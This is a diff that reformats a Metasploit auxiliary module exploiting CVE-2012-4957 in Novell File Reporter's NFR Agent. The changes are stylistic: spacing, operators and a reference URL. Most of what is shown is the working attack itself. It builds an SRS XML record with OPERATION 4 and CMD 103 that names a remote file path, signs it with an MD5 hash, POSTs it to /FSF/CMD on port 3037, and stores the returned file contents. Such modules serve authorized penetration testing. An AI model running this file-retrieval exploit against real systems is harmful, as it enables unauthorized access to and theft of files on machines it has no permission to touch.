@@ -10,38 +10,39 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'         => 'NFR Agent SRS Record Arbitrary Remote File Access',
-      'Description'  =>  %q{
+      'Name' => 'NFR Agent SRS Record Arbitrary Remote File Access',
+      'Description' => '
         NFRAgent.exe, a component of Novell File Reporter (NFR), allows remote attackers to retrieve
         arbitrary files via a request to /FSF/CMD with a SRS Record with OPERATION 4 and
         CMD 103, specifying a full pathname. This module has been tested successfully
         against NFR Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File
         Reporter 1.0.1).
-      },
-      'References'   =>
+      ',
+      'References' =>
         [
           [ 'CVE', '2012-4957' ],
-          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959' ]
+          [ 'URL', 'https://blog.rapid7.com/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959' ]
         ],
-      'Author'       =>
+      'Author' =>
         [
           'juan vazquez'
         ],
-      'License'      => MSF_LICENSE,
+      'License' => MSF_LICENSE,
       'DisclosureDate' => "Nov 16 2012"
     )
 
     register_options(
-    [
-      Opt::RPORT(3037),
-      OptBool.new('SSL', [true, 'Use SSL', true]),
-      OptString.new('RFILE', [true, 'Remote File', 'c:\\windows\\win.ini'])
-    ])
+      [
+        Opt::RPORT(3037),
+        OptBool.new('SSL', [true, 'Use SSL', true]),
+        OptString.new('RFILE', [true, 'Remote File', 'c:\\windows\\win.ini'])
+      ]
+    )
 
     register_autofilter_ports([ 3037 ])
   end
 
-  def run_host(ip)
+  def run_host(_ip)
 
     record = "<RECORD><NAME>SRS</NAME><OPERATION>4</OPERATION><CMD>103</CMD><PATH>#{datastore['RFILE']}</PATH></RECORD>"
     md5 = Rex::Text.md5("SRS" + record + "SERVER").upcase
@@ -50,15 +51,14 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Retrieving the file contents")
 
     res = send_request_cgi(
-      {
-        'uri'     => '/FSF/CMD',
-        'version' => '1.1',
-        'method'  => 'POST',
-        'ctype'   => "text/xml",
-        'data'    => message
-      })
+      'uri' => '/FSF/CMD',
+      'version' => '1.1',
+      'method' => 'POST',
+      'ctype' => "text/xml",
+      'data' => message
+    )
 
-    if res and res.code == 200 and not res.body =~ /<RESULT>/
+    if res && (res.code == 200) && (res.body !~ /<RESULT>/)
       loot = res.body
       f = ::File.basename(datastore['RFILE'])
       path = store_loot('novell.filereporter.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
@@ -68,4 +68,3 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 end
-
